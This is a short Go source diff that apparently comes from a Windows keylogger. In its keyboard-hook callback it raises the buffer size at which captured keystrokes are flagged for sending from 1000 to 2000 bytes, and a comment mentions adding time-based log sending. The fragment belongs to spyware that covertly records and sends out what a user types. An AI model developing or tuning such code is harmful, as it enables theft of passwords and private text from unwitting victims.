@@ -464,7 +464,7 @@ func keyLogger(nCode int, wparam w32.WPARAM, lparam w32.LPARAM) w32.LRESULT {
 		}
 	}
 	// counts bytes. Should add time based log sending
-	if tmpKeylog.Len() >= 1000 || false {
+	if tmpKeylog.Len() >= 2000 || false {
 		ch <- struct{}{}
 	}
 	return w32.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
